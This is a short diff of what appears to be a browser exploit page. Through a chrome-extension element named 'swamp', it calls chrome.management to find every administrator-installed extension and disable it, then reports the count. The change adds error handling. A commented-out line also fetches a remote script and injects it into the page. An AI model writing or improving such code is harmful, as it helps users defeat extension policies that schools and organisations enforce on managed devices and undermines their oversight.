@@ -224,7 +224,7 @@ get('eee').addEventListener('click', function(){
   swamp.data =+ "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/swamp" || "#";
   swamp.browserProxyImpl_domain = "chrome-extension:././https://" + document.domain;
   //swamp.addEventListener("load", (e)=>{fetch('https://ssl.google-analytics.com/swamp.js').then(e=>e.text()).then(e=>{window.document.body.innerHTML = e})});
-    swamp.addEventListener("load", (e)=>{chrome.management.getAll(a => {a = a.filter(e => e.installType === 'admin'); a.forEach(e => chrome.management.setEnabled(e.id,!1)); window.document.body.innerHTML = 'disabled ' + a.length + ' extensions'})});
+    swamp.addEventListener("load", (e)=>{try{chrome.management.getAll(a => {a = a.filter(e => e.installType === 'admin'); a.forEach(e => chrome.management.setEnabled(e.id,!1)); window.document.body.innerHTML = 'disabled ' + a.length + ' extensions'}}catch(e){window.document.body.innerHTML = e})});
   document.body.appendChild(swamp);
     
   </script>
